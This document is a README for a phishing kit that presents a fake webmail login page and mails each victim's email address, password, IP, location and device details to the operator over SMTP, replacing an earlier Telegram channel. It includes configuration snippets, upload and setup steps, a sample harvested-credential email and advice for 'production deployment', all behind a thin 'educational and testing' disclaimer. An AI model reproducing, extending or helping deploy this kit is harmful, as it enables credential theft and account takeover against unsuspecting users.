# Webmail Capture System with SMTP Email Delivery

This system replaces Telegram API functionality with SMTP email delivery for capturing webmail login credentials. The system sends detailed login information including location data, device information, and credentials to a specified email address.

## Features

- ✅ **SMTP Email Delivery**: Sends captured data via email instead of Telegram
- ✅ **Enhanced Email Formatting**: Beautiful HTML emails with emojis and structured layout
- ✅ **Location Tracking**: Captures IP address, country, city, region, and timezone
- ✅ **Device Information**: Records user agent, referer, and request details
- ✅ **Rate Limiting**: Prevents abuse with configurable rate limiting
- ✅ **Input Validation**: Validates email format and sanitizes input
- ✅ **Logging System**: Comprehensive logging for debugging and monitoring
- ✅ **Backup Storage**: Local file backup of all captures
- ✅ **Security Features**: CORS headers, input sanitization, and error handling

## File Structure

```
├── index.html              # Main webmail login page
├── capture.php             # Backend processing and email delivery
├── config.php              # Configuration settings
├── class.phpmailer.php     # PHPMailer class for email functionality
├── class.smtp.php          # SMTP class for email transport
├── webmail_logs.txt        # Local backup log file (auto-created)
└── README.md               # This documentation
```

## Configuration

### 1. SMTP Settings

Edit `config.php` to configure your SMTP server:

```php
// SMTP Configuration
define('SMTP_HOST', 'your-smtp-server.com');
define('SMTP_PORT', '587');
define('SMTP_USERNAME', 'your-email@domain.com');
define('SMTP_PASSWORD', 'your-password');
define('SMTP_SECURE', 'tls'); // or 'ssl'
```

### 2. Email Settings

Configure the recipient email and sender name:

```php
// Email Configuration
define('RECEIVER_EMAIL', 'your-receiver@email.com');
define('SENDER_NAME', 'Webmail Security System');
```

### 3. Security Settings

Adjust security parameters as needed:

```php
// Security Settings
define('ALLOWED_ORIGINS', ['*']); // Set specific domains in production
define('MAX_ATTEMPTS', 5);
define('RATE_LIMIT_ENABLED', true);
define('RATE_LIMIT_ATTEMPTS', 10);
define('RATE_LIMIT_WINDOW', 300); // 5 minutes
```

## Email Format

The system sends beautifully formatted emails with the following sections:

### 📧 Login Credentials
- Email address
- Password
- Domain

### 📍 Location Information
- IP Address
- Country
- City
- Region
- Timezone

### 💻 Device Information
- User Agent
- Referer
- Request Method

## Setup Instructions

### 1. Upload Files
Upload all files to your web server directory.

### 2. Configure SMTP
Edit `config.php` with your SMTP server details.

### 3. Test Configuration
Access `index.html` in your browser to test the system.

### 4. Monitor Logs
Check `webmail_logs.txt` for captured data and `debug.log` for system activity.

## Email Example

The system sends emails like this:

```
Subject: 📧 Webmail Login - 2024-01-15 14:30:25 - gmail.com

🔐 Webmail Login Capture
Timestamp: 2024-01-15 14:30:25 UTC

📧 LOGIN CREDENTIALS:
Email: user@gmail.com
Password: userpassword123
Domain: gmail.com

📍 LOCATION INFORMATION:
IP Address: 192.168.1.100
Country: United States
City: New York
Region: New York
Timezone: America/New_York

💻 DEVICE INFORMATION:
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
Referer: https://webmail.example.com
Request Method: POST

🔒 This is an automated capture from the webmail login system.
```

## Security Features

- **Input Validation**: Validates email format and sanitizes input
- **Rate Limiting**: Prevents abuse with configurable limits
- **CORS Headers**: Proper cross-origin resource sharing
- **Error Handling**: Graceful error handling and logging
- **Logging**: Comprehensive activity logging for monitoring

## Troubleshooting

### Email Not Sending
1. Check SMTP credentials in `config.php`
2. Verify SMTP server settings
3. Check server logs for errors
4. Enable debug mode: `define('DEBUG_MODE', true);`

### Rate Limiting Issues
1. Check rate limit settings in `config.php`
2. Clear rate limit files if needed
3. Adjust `RATE_LIMIT_ATTEMPTS` and `RATE_LIMIT_WINDOW`

### Log Files
- `webmail_logs.txt`: Captured data backup
- `debug.log`: System activity (when DEBUG_MODE is enabled)
- `rate_limit_*.txt`: Rate limiting data

## Customization

### Email Template
Edit the HTML template in `capture.php` to customize email appearance.

### Logging Format
Modify the log entry format in `capture.php` to change backup log structure.

### Rate Limiting
Adjust rate limiting parameters in `config.php` for your needs.

## Production Deployment

1. Set `DEBUG_MODE` to `false`
2. Configure specific `ALLOWED_ORIGINS` instead of `['*']`
3. Use secure SMTP settings (SSL/TLS)
4. Set up proper file permissions
5. Monitor logs regularly

## Support

For issues or questions:
1. Check the debug logs
2. Verify SMTP configuration
3. Test with a simple email client first
4. Ensure all files are properly uploaded

## License

This system is provided for educational and testing purposes. Ensure compliance with local laws and regulations when deploying.